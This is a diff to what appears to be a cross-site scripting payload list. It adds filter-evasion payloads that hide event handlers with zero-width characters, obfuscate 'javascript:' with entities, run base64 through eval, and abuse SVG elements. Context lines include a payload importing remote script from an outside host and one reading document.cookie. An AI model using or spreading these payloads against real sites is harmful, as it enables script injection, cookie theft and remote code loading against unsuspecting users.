@@ -6,6 +6,7 @@
 OnXSS=<Img/Src/OnError=(alert)(1)>
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 a onclick="alert(1)">XSS</a>
+<input autofocus onfocus​=alert('XSS')>
 <svg onload=alert(1)>
 '" onfocus=alert(1) autofocus x="
 <img src=x onerror=alert(1)>
@@ -21,6 +22,13 @@ a onclick="alert(1)">XSS</a>
 /</title><img src=x onerror="confirm('Hacked_By_h6nt3r')">
 <iframe src=javascript:alert(1)>
 <body onload=alert('XSS')>
+<img src=x onerror​=ja&#x76;ascript​:al&#x65;rt(1)>
+<svg onload​=eval(atob('YWxlcnQoJ1hTUycp'))></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><​script>alert('XSS')<​/script></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload​=alert('XSS')></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin​=alert('XSS') attributeName=x dur=1s></animate></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href=x onerror​=alert('XSS')></image></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="400" height="400"><body xmlns="https://lnkd.in/dnneR-sD"><​script>alert('XSS')<​/script></body></foreignObject></svg>
 '"><svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
 ">>>>>><marquee>RXSS</marquee></head><abc></script><script>alert(document.cookie)</script><meta
 "><svg/onload=prompt('H6nt3r')>
